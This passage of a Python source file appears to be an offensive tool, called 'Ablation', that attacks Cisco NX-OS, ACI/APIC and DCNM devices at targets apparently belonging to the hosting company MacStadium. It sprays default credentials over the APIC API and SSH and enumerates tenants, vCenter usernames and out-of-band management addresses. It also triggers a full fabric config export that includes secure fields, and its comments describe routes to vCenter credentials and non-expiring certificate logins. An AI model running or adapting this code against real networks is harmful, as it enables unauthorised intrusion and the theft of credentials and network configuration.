        "note": (
            "APIC REST API exposes cert-based auth objects (aaaUserCert). "
            "SSH authorized_keys at /home/admin/.ssh/authorized_keys requires "
            "SSH shell access or local console."
        ),
    }

    resp = _apic_get(apic_host, "/api/node/class/aaaUserCert.json", token=token)
    if resp and "imdata" in resp:
        for item in resp["imdata"]:
            attrs = item.get("aaaUserCert", {}).get("attributes", {})
            result["x509_certs"].append({
                "dn": attrs.get("dn", ""),
                "name": attrs.get("name", ""),
                "user": attrs.get("dn", "").split("/")[2].replace("user-", "")
                        if "user-" in attrs.get("dn", "") else "",
                "data_preview": attrs.get("data", "")[:120],  # PEM cert header
                "created": attrs.get("createTs", ""),
            })

    return result


def apic_cobra_bulk_extract(apic_host: str, token: str) -> dict:
    """Cobra SDK pattern for bulk configuration extraction.

    The Cobra SDK is Cisco's official Python SDK for ACI. It ships on the
    APIC itself at https://<APIC>/cobra/_downloads/ as two .whl packages:
      - acicobra-<version>-py2.py3-none-any.whl  (core session/request layer)
      - acimodel-<version>-py2.py3-none-any.whl  (MIT model objects)

    Install: pip3 install acicobra-*.whl && pip3 install acimodel-*.whl

    Cobra authentication pattern (from official SDK docs):
      from cobra.mit.access import MoDirectory
      from cobra.mit.session import LoginSession
      moDir = MoDirectory(LoginSession(url, username, password))
      moDir.login()

    Bulk class query:
      tenants = moDir.lookupByClass("fvTenant")
      epgs = moDir.lookupByClass("fvAEPg")
      contracts = moDir.lookupByClass("vzBrCP")

    X.509 signature-based auth (no password per call — preferred for automation):
      from cobra.mit.session import CertSession
      # Generate: openssl req -new -newkey rsa:1024 -days 36500 -nodes -x509
      #           -keyout user.key -out user.crt
      # Upload user.crt to APIC: Admin -> AAA -> Users -> <user> -> User Cert
      session = CertSession(url, "user-cert", "/path/to/user.key", secure=False)
      moDir = MoDirectory(session)
      # Each REST call is signed with the private key; no login() needed.

    This function returns the Cobra download URL and confirms the endpoint is
    reachable (package disclosure without auth).
    """
    result = {
        "cobra_download_url": f"https://{apic_host}/cobra/_downloads/",
        "packages_accessible": False,
        "packages": [],
        "note": (
            "Cobra SDK ships on the APIC. Download acicobra + acimodel .whl files, "
            "install via pip3, then use MoDirectory.lookupByClass() for bulk extraction. "
            "CertSession supports X.509 signature auth (no stored password in scripts)."
        ),
    }

    # Probe cobra download endpoint — accessible without auth on some versions
    url = f"https://{apic_host}/cobra/_downloads/"
    headers = {"Accept": "text/html"}
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=6) as r:
            body = r.read().decode(errors="ignore")
            result["packages_accessible"] = True
            # Parse .whl filenames from directory listing
            for m in re.finditer(r'href="([^"]*\.whl)"', body):
                result["packages"].append(m.group(1))
    except urllib.error.HTTPError as e:
        result["http_error"] = e.code
    except Exception:
        pass

    return result


def apic_get_fabric_nodes(apic_host: str, token: str) -> list:
    """Enumerate all fabric nodes (spine/leaf/controller) with firmware versions.

    Uses subtree query to include firmwareRunning child objects per node.
    Each node entry: nodeId, role, address, fabricSt, serialNumber, model,
    running firmware version.
    """
    path = (
        "/api/node/class/fabricNode.json"
        "?query-target=self"
        "&rsp-subtree=full"
        "&rsp-subtree-class=firmwareRunning,topSystem"
    )
    data = _apic_get(apic_host, path, token)
    nodes = []
    for item in data.get("imdata", []):
        attrs = item.get("fabricNode", {}).get("attributes", {})
        if not attrs:
            continue
        nodes.append({
            "node_id": attrs.get("id"),
            "role": attrs.get("role"),   # controller / spine / leaf
            "address": attrs.get("address"),
            "fabric_state": attrs.get("fabricSt"),
            "dn": attrs.get("dn"),
            "serial": attrs.get("serial"),
            "model": attrs.get("model"),
            "children": item.get("fabricNode", {}).get("children", []),
        })
    return nodes


def apic_get_vmm_providers(apic_host: str, token: str) -> list:
    """Enumerate VMM providers (vCenter/OpenStack/K8s/Nutanix/CloudFoundry).

    vmmProvP class — each provider represents an integration domain type.
    Subtree includes vmmCtrlrP (controller IP/datacenter) and vmmUsrAccP
    (credential object referencing vCenter username).

    Attack surface: VMM credential objects can yield vCenter admin credentials
    via vmmUsrAccP.usr and associated vmmUsrAccP password (shown in APIC GUI
    but not in GET response — credential extraction requires POST to vmmUsrAccP
    or sniffing the APIC provisioner traffic on port 443 to vCenter).
    """
    path = (
        "/api/node/class/vmmProvP.json"
        "?query-target=subtree"
        "&target-subtree-class=vmmCtrlrP,vmmUsrAccP,vmmVSwitchPolicyCont"
    )
    data = _apic_get(apic_host, path, token)
    providers = []
    for item in data.get("imdata", []):
        cls = next(iter(item), None)
        if not cls:
            continue
        attrs = item[cls].get("attributes", {})
        providers.append({
            "class": cls,
            "dn": attrs.get("dn"),
            "name": attrs.get("name"),
            "vendor": attrs.get("vendor"),
            "mode": attrs.get("mode"),
            "host_or_ip": attrs.get("hostOrIp"),  # vCenter IP (vmmCtrlrP)
            "datacenter": attrs.get("rootContName"),  # vCenter datacenter name
            "usr": attrs.get("usr"),  # vCenter username (vmmUsrAccP)
            "encap_mode": attrs.get("encapMode"),
        })
    return providers


def apic_get_service_graphs(apic_host: str, token: str) -> list:
    """Enumerate Layer 4–7 service graph device clusters.

    vnsLDevVip — logical device clusters backing service graphs
    (firewalls, load balancers, service appliances).
    Subtree includes vnsLIf (cluster interfaces) and vnsCDev (concrete devices).

    Attack surface: service graph clusters reveal L4-L7 appliance IPs and may
    contain out-of-band management paths. vnsCDev.devCtxLbl holds device labels;
    vnsLIf has the interface binding to physical/virtual paths.
    """
    path = (
        "/api/node/class/vnsLDevVip.json"
        "?query-target=subtree"
        "&target-subtree-class=vnsLIf,vnsCDev,vnsCif"
    )
    data = _apic_get(apic_host, path, token)
    graphs = []
    for item in data.get("imdata", []):
        cls = next(iter(item), None)
        if not cls:
            continue
        attrs = item[cls].get("attributes", {})
        graphs.append({
            "class": cls,
            "dn": attrs.get("dn"),
            "name": attrs.get("name"),
            "context_aware": attrs.get("contextAware"),
            "dev_type": attrs.get("devtype"),
            "function_type": attrs.get("funcType"),
            "is_copy": attrs.get("isCopy"),
            "management_epg": attrs.get("managed"),
            "children": item[cls].get("children", []),
        })
    return graphs


def apic_get_tenants(apic_host: str, token: str) -> list:
    """Enumerate all tenants with health scores.

    fvTenant with rsp-subtree-include=health to surface health degradation
    (faults in a tenant = recently changed or misconfigured policy objects).

    Common system tenants: common, mgmt, infra — policy in these affects
    all other tenants. Finding writeable objects in 'common' = fabric-wide impact.
    """
    path = (
        "/api/node/class/fvTenant.json"
        "?rsp-subtree-include=health"
    )
    data = _apic_get(apic_host, path, token)
    tenants = []
    for item in data.get("imdata", []):
        attrs = item.get("fvTenant", {}).get("attributes", {})
        children = item.get("fvTenant", {}).get("children", [])
        health = None
        for child in children:
            h = child.get("healthInst", {}).get("attributes", {})
            if h:
                health = h.get("cur")
        if not attrs:
            continue
        tenants.append({
            "name": attrs.get("name"),
            "dn": attrs.get("dn"),
            "descr": attrs.get("descr"),
            "health_score": health,
        })
    return tenants


def apic_get_contracts(apic_host: str, token: str) -> list:
    """Enumerate contract objects with subjects and L4 filter entries.

    vzBrCP (contract) -> vzSubj (subject) -> vzRsSubjFiltAtt -> vzFilter -> vzEntry.
    vzEntry exposes the actual L4 policy: dFromPort, dToPort, prot (tcp/udp/icmp),
    sFromPort, sToPort, etherT, stateful, arpOpc.

    An 'any-any permit all' contract (prot=unspecified, dFromPort=unspecified)
    on the 'common' tenant is a fabric-wide allow-all — critical finding.
    """
    path = (
        "/api/node/class/vzBrCP.json"
        "?query-target=subtree"
        "&target-subtree-class=vzSubj,vzRsSubjFiltAtt,vzFilter,vzEntry"
    )
    data = _apic_get(apic_host, path, token)
    contracts = []
    for item in data.get("imdata", []):
        cls = next(iter(item), None)
        if not cls:
            continue
        attrs = item[cls].get("attributes", {})
        entry = {
            "class": cls,
            "dn": attrs.get("dn"),
            "name": attrs.get("name"),
            "scope": attrs.get("scope"),  # tenant / vrf / global / application-profile
            "prio": attrs.get("prio"),
        }
        # Capture L4 filter entry details
        if cls == "vzEntry":
            entry.update({
                "ether_type": attrs.get("etherT"),
                "protocol": attrs.get("prot"),
                "dst_from_port": attrs.get("dFromPort"),
                "dst_to_port": attrs.get("dToPort"),
                "src_from_port": attrs.get("sFromPort"),
                "src_to_port": attrs.get("sToPort"),
                "stateful": attrs.get("stateful"),
                "apply_to_frag": attrs.get("applyToFrag"),
            })
            # Flag any-any permit
            if (attrs.get("prot") in ("unspecified", "") and
                    attrs.get("dFromPort") in ("unspecified", "0", "")):
                entry["permit_all"] = True
        contracts.append(entry)
    return contracts


def apic_cert_auth(apic_host: str, username: str, key_pem: str,
                   cert_dn: str = None) -> Optional[str]:
    """X.509 certificate-based authentication (CertSession) against APIC.

    APIC supports signature-based auth where each request is signed with
    a private key instead of using a session cookie. The token returned
    is valid indefinitely (no expiry) unlike password-based tokens (600s default).

    Flow:
      1. Build the payload string: METHOD + PATH + BODY (concatenated, no spaces)
      2. Sign with RSA private key using SHA256withRSA
      3. Base64-encode the signature
      4. Send as header: Cookie: APIC-Request-Signature=<sig>;APIC-dn=<dn>;
                                 APIC-Request-Hash-Algorithm=v3;
                                 APIC-Certificate-Fingerprint=<fingerprint>

    This function probes whether the APIC accepts certificate auth by checking
    for the /api/aaaLogin.json endpoint and returning the cert_dn format string.
    Full signing requires the private key material (not performed here).

    cert_dn format: uni/userext/user-<username>/usercert-<certname>
    """
    import hashlib

    result = {
        "cert_auth_supported": False,
        "cert_dn_format": f"uni/userext/user-{username}/usercert-<certname>",
        "signing_algorithm": "SHA256withRSA",
        "token_lifetime": "indefinite (no expiry)",
        "header_format": (
            f"Cookie: APIC-Request-Signature=<sig>;"
            f"APIC-dn=uni/userext/user-{username}/usercert-<certname>;"
            f"APIC-Request-Hash-Algorithm=v3;"
            f"APIC-Certificate-Fingerprint=<sha256_fingerprint>"
        ),
        "payload_format": "METHOD + PATH + BODY (concatenated)",
        "note": (
            "CertSession tokens have no expiry. Once a cert is uploaded to "
            "APIC under a user account, it can be used to sign any REST call "
            "without a password. Upload cert: Admin->AAA->Users-><user>->User Cert."
        ),
    }

    # Probe: check if APIC responds to cert-signed request (we detect support
    # by testing whether the endpoint is reachable — full signing needs the key)
    try:
        url = f"https://{apic_host}/api/aaaLogin.json"
        req = urllib.request.Request(url, method="HEAD")
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=5) as r:
            result["cert_auth_supported"] = True
            result["server"] = r.headers.get("Server", "")
    except urllib.error.HTTPError as e:
        if e.code in (405, 400):
            result["cert_auth_supported"] = True  # endpoint exists
    except Exception:
        pass

    return result


def apic_get_out_of_band_mgmt(apic_host: str, token: str) -> list:
    """Enumerate out-of-band management network configuration.

    mgmtOoB — the OOB management EPG (typically VLAN 0, separate physical path).
    mgmtRsOoBStNode — node IP assignments in the OOB management address space.
    mgmtOoBZone — zones if OOB is segmented.

    Returns per-node OOB IP addresses and the OOB management gateway.
    These IPs are direct management addresses to each leaf/spine outside
    the fabric data plane — not reachable from the tenant network.
    """
    paths = [
        "/api/node/class/mgmtOoB.json?query-target=subtree&target-subtree-class=mgmtRsOoBStNode",
        "/api/node/class/mgmtMgmtP.json?query-target=subtree&target-subtree-class=mgmtOoB,mgmtRsOoBStNode",
        "/api/node/mo/uni/infra/funcprof/grp-default.json?query-target=subtree",
    ]
    results = []
    for path in paths:
        data = _apic_get(apic_host, path, token)
        for item in data.get("imdata", []):
            cls = next(iter(item), None)
            if not cls:
                continue
            attrs = item[cls].get("attributes", {})
            results.append({
                "class": cls,
                "dn": attrs.get("dn"),
                "name": attrs.get("name"),
                "addr": attrs.get("addr"),           # node OOB IP
                "gw": attrs.get("gw"),               # OOB gateway
                "v6_addr": attrs.get("v6Addr"),
                "v6_gw": attrs.get("v6Gw"),
                "node": attrs.get("tDn"),            # topology/pod-N/node-N
                "epg_dn": attrs.get("tnMgmtOoBName"),
            })
    return results


def apic_export_config(apic_host: str, token: str,
                       export_name: str = "ablation-export") -> dict:
    """Trigger a fabric configuration export (backup).

    configExportP defines a named export policy. POSTing to instantiate it
    with 'adminSt: triggered' causes APIC to immediately write a full fabric
    configuration snapshot to the configured remote path (or local APIC storage).

    The export includes ALL tenant policy, fabric access policy, VMM integration
    config, and AAA configuration — essentially the entire MIM serialized to JSON/XML.

    If no remote path is configured, the export lands at:
      /data/techsupport/ on the APIC (accessible via SCP or the GUI export tab).

    The trigger POST body also supports 'format: json' or 'format: xml'.
    """
    # First, check if an export policy already exists (avoid overwriting production backup)
    check_path = "/api/node/class/configExportP.json"
    existing = _apic_get(apic_host, check_path, token)
    existing_policies = [
        item.get("configExportP", {}).get("attributes", {}).get("name")
        for item in existing.get("imdata", [])
    ]

    result = {
        "existing_export_policies": existing_policies,
        "trigger_attempted": False,
        "trigger_response": None,
        "note": (
            "configExportP with adminSt=triggered exports full fabric config. "
            "Export lands at /data/techsupport/ on APIC if no remote target. "
            "Exported file contains all tenant policy, VMM creds refs, AAA config."
        ),
    }

    # Only trigger if no production export policy exists (avoid interfering)
    if not existing_policies:
        trigger_body = {
            "configExportP": {
                "attributes": {
                    "name": export_name,
                    "adminSt": "triggered",
                    "format": "json",
                    "includeSecureFields": "yes",
                    "snapshot": "false",
                    "targetDn": "",
                }
            }
        }
        trigger_path = "/api/mo/uni/fabric/configexp-" + export_name + ".json"
        resp = _apic_post(apic_host, trigger_path, trigger_body, token)
        result["trigger_attempted"] = True
        result["trigger_response"] = resp
    else:
        result["skip_reason"] = "existing export policies found — not overwriting"

    return result


def probe_nxos_ports(host: str) -> dict:
    """TCP port probe for NX-OS management surface."""
    open_ports = {}
    all_ports = dict(list(NXOS_PORTS.items()) + list(APIC_PORTS.items()))
    for port, label in all_ports.items():
        try:
            sock = socket.create_connection((host, port), timeout=3)
            sock.close()
            open_ports[port] = label
        except Exception:
            pass
    return {"host": host, "open_ports": open_ports}


def probe_nxos_ssh_banner(host: str, timeout: int = 5) -> Optional[str]:
    """Grab SSH banner from NX-OS — reveals platform/version."""
    try:
        sock = socket.create_connection((host, 22), timeout=timeout)
        banner = sock.recv(256).decode(errors="ignore").strip()
        sock.close()
        return banner
    except Exception:
        return None


def run_nxos_commands(host: str, username: str, password: str,
                      commands: Optional[list] = None) -> dict:
    """Execute NX-OS CLI commands over SSH via subprocess."""
    if commands is None:
        commands = NXOS_ENUM_COMMANDS

    result = {"host": host, "authenticated": False, "outputs": {}}

    # Build SSH batch
    cmd_str = "\n".join(commands)
    ssh_args = [
        "sshpass", "-p", password,
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=8",
        "-o", "BatchMode=no",
        f"{username}@{host}",
    ]

    try:
        proc = subprocess.run(
            ssh_args,
            input=cmd_str,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = proc.stdout + proc.stderr

        if "denied" in output.lower() or "authentication failed" in output.lower():
            return result

        result["authenticated"] = True
        result["raw_output"] = output

        # Parse per-command output blocks
        current_cmd = None
        current_lines = []
        for line in output.splitlines():
            # NX-OS prompt typically ends with #
            if "# " in line or line.strip().startswith("switch") or line.strip().startswith("N9K"):
                if current_cmd and current_lines:
                    result["outputs"][current_cmd] = "\n".join(current_lines)
                current_cmd = line.strip()
                current_lines = []
            elif current_cmd:
                current_lines.append(line)
        if current_cmd and current_lines:
            result["outputs"][current_cmd] = "\n".join(current_lines)

    except Exception:
        pass

    return result


def parse_nxos_version(version_output: str) -> dict:
    """Extract structured data from 'show version' output."""
    info = {}
    patterns = {
        "hostname":      r"Nexus[:\s]+(\S+)",
        "nxos_version":  r"system:\s+version\s+(\S+)",
        "kickstart":     r"kickstart:\s+version\s+(\S+)",
        "platform":      r"Hardware\s+cisco\s+(Nexus\s+\S+\s+\S+)",
        "serial":        r"Processor Board ID\s+(\S+)",
        "uptime":        r"Kernel uptime is\s+(.+)",
    }
    for key, pat in patterns.items():
        m = re.search(pat, version_output, re.IGNORECASE)
        if m:
            info[key] = m.group(1).strip()
    return info


def parse_nxos_license_id(license_output: str) -> Optional[str]:
    """Extract VDH serial from 'show license host-id' — used in license attacks."""
    m = re.search(r"VDH=([A-Za-z0-9]+)", license_output)
    return m.group(1) if m else None


def probe_nxapi(host: str) -> dict:
    """Probe Cisco NX-API (REST API on NX-OS, distinct from APIC)."""
    result = {"host": host, "reachable": False, "version": None}

    url = f"https://{host}/ins"
    payload = {
        "ins_api": {
            "version": "1.0",
            "type": "cli_show",
            "chunk": "0",
            "sid": "1",
            "input": "show version",
            "output_format": "json",
        }
    }
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": "Basic " + base64.b64encode(b"admin:admin").decode(),
    }

    try:
        data = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=6) as r:
            resp = json.loads(r.read().decode())
            result["reachable"] = True
            result["response"] = resp
    except urllib.error.HTTPError as e:
        if e.code == 401:
            result["reachable"] = True
            result["auth_required"] = True
        result["http_error"] = e.code
    except Exception:
        pass

    return result


def probe_vxlan_vteps(local_host: str) -> dict:
    """Query NVE peers via SSH — discovers VTEP adjacency table."""
    result = {"host": local_host, "vteps": [], "vnis": []}

    # Try without auth — just grab via show commands if SSH accessible
    nve_cmd = "show nve peers\nshow nve vni\nshow bgp l2vpn evpn summary"
    ssh_args = [
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=5",
        "-o", "BatchMode=yes",
        f"admin@{local_host}",
    ]

    try:
        proc = subprocess.run(
            ssh_args,
            input=nve_cmd,
            capture_output=True,
            text=True,
            timeout=15,
        )
        output = proc.stdout

        # Parse VTEP IPs
        for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+UP", output):
            result["vteps"].append(m.group(1))

        # Parse VNIs
        for m in re.finditer(r"(\d{6,8})\s+\d+", output):
            vni = int(m.group(1))
            if 1 <= vni <= 16_777_215:
                result["vnis"].append(vni)

    except Exception:
        pass

    return result


def probe_dcnm(host: str) -> dict:
    """Probe DCNM (Data Center Network Manager) on port 443/9443."""
    result = {"host": host, "reachable": False, "endpoints": {}}

    dcnm_paths = [
        "/rest/dcnm-version",        # unauthenticated version disclosure
        "/rest/logon",               # login endpoint
        "/rest/globalConfig",        # global config (needs auth)
        "/rest/control/switches",    # fabric switches
        "/rest/control/fabrics",     # fabric list
        "/rest/inventory/switches",  # inventory
    ]

    for path in dcnm_paths:
        url = f"https://{host}{path}"
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, context=_SSL_CTX, timeout=5) as r:
                body = r.read().decode()
                result["reachable"] = True
                result["endpoints"][path] = {
                    "status": r.getcode(),
                    "body_preview": body[:256],
                }
        except urllib.error.HTTPError as e:
            result["endpoints"][path] = {"status": e.code}
            if e.code not in (401, 403):
                result["reachable"] = True
        except Exception:
            result["endpoints"][path] = {"status": "error"}

    return result


class NXOSEnumerator:
    """Cisco NX-OS, ACI/APIC, and VXLAN enumeration for Ablation."""

    def __init__(self, targets=None):
        self.targets = targets or MACSTADIUM_CISCO_TARGETS
        self.findings = []

    def run(self) -> dict:
        results = {
            "cert_classification": [],
            "apic_unauthenticated": [],
            "apic_credential_spray": [],
            "apic_full_enum": [],
            "apic_cobra_probe": [],
            "nxos_port_surface": [],
            "nxos_ssh_banners": [],
            "nxos_ssh_commands": [],
            "nxapi_probe": [],
            "dcnm_probe": [],
            "vxlan_vtep_probe": [],
            "summary": {},
        }

        for target in self.targets:
            host = target["ip"]
            role = target.get("role", "unknown")

            # OU discriminator — classify before any auth attempt
            cert_class = classify_by_cert_ou(host, port=443)
            results["cert_classification"].append(cert_class)
            device_type = cert_class.get("device_type", "UNKNOWN")
            target["_cert_ou"]      = cert_class.get("ou", "unknown")
            target["_device_type"]  = device_type
            target["_cert_cn"]      = cert_class.get("cn", "")

            # Port surface
            port_result = probe_nxos_ports(host)
            results["nxos_port_surface"].append(port_result)

            open_ports = port_result.get("open_ports", {})
            if not open_ports:
                continue

            # APIC candidates — only when cert says APIC_CONTROLLER or role hints at it
            if 443 in open_ports and device_type in ("APIC_CONTROLLER", "UNKNOWN"):
                unauth = probe_apic_unauthenticated(host)
                results["apic_unauthenticated"].append(unauth)

                if unauth["reachable"]:
                    cred_result = apic_brute_creds(host)
                    cred_result["host"] = host
                    results["apic_credential_spray"].append(cred_result)

                    if cred_result["success"]:
                        token = cred_result["token"]
                        enum = apic_enumerate(host, token)
                        results["apic_full_enum"].append(enum)

                        # Cobra SDK endpoint probe (package disclosure)
                        cobra_probe = apic_cobra_bulk_extract(host, token)
                        results["apic_cobra_probe"].append(cobra_probe)

                        self.findings.append({
                            "type": "APIC_AUTH",
                            "severity": "CRITICAL",
                            "host": host,
                            "creds": f"{cred_result['username']}:{cred_result['password']}",
                            "tenant_count": len(enum.get("tenant_names", [])),
                            "user_count": len(enum.get("users", [])),
                            "vmm_domain_count": len(enum.get("vmm_domains", [])),
                            "l3out_count": len(enum.get("l3out_networks", [])),
                            "endpoint_count": len(enum.get("endpoints", [])),
                            "audit_log_entries": len(enum.get("audit_log", [])),
                            "firmware": [
                                f"{n['address']}({n['role']})={n['fw_version']}"
                                for n in enum.get("firmware", []) if n.get("fw_version")
                            ],
                        })

                # NX-API probe (NX-OS with NXAPI enabled)
                nxapi = probe_nxapi(host)
                if nxapi["reachable"]:
                    results["nxapi_probe"].append(nxapi)

                # DCNM probe
                dcnm = probe_dcnm(host)
                if dcnm["reachable"]:
                    results["dcnm_probe"].append(dcnm)

            # SSH surface
            if 22 in open_ports:
                banner = probe_nxos_ssh_banner(host)
                results["nxos_ssh_banners"].append({"host": host, "banner": banner})

                for user, pwd in NXOS_DEFAULT_CREDS[:4]:
                    ssh_result = run_nxos_commands(host, user, pwd,
                                                    commands=["show version", "show license host-id", "show users"])
                    if ssh_result["authenticated"]:
                        ssh_result["username"] = user
                        ssh_result["password"] = pwd
                        results["nxos_ssh_commands"].append(ssh_result)

                        version_out = ssh_result.get("raw_output", "")
                        version_info = parse_nxos_version(version_out)
                        license_id = parse_nxos_license_id(version_out)

                        self.findings.append({
                            "type": "NXOS_AUTH",
                            "severity": "CRITICAL",
                            "host": host,
                            "creds": f"{user}:{pwd}",
                            "version_info": version_info,
                            "license_id": license_id,
                        })

                        vtep_data = probe_vxlan_vteps(host)
                        if vtep_data["vteps"]:
                            results["vxlan_vtep_probe"].append(vtep_data)
                        break

        # Summarize
        results["summary"] = {
            "hosts_scanned": len(self.targets),
            "apic_reachable": sum(
                1 for r in results["apic_unauthenticated"] if r.get("reachable")),
            "apic_creds_valid": sum(
                1 for r in results["apic_credential_spray"] if r.get("success")),
            "nxos_ssh_auth": sum(
                1 for r in results["nxos_ssh_commands"] if r.get("authenticated")),
            "vmm_domains_found": sum(
                len(e.get("vmm_domains", [])) for e in results["apic_full_enum"]),
            "l3outs_found": sum(
                len(e.get("l3out_networks", [])) for e in results["apic_full_enum"]),
            "endpoints_tracked": sum(
                len(e.get("endpoints", [])) for e in results["apic_full_enum"]),
            "audit_log_entries": sum(
                len(e.get("audit_log", [])) for e in results["apic_full_enum"]),
            "findings_count": len(self.findings),
            "critical_findings": [f for f in self.findings if f.get("severity") == "CRITICAL"],
        }

        return results


def enumerate_macstadium_cisco() -> dict:
    """Top-level: enumerate all MacStadium Cisco NX-OS / ACI targets."""
    enumerator = NXOSEnumerator(targets=MACSTADIUM_CISCO_TARGETS)
    return enumerator.run()
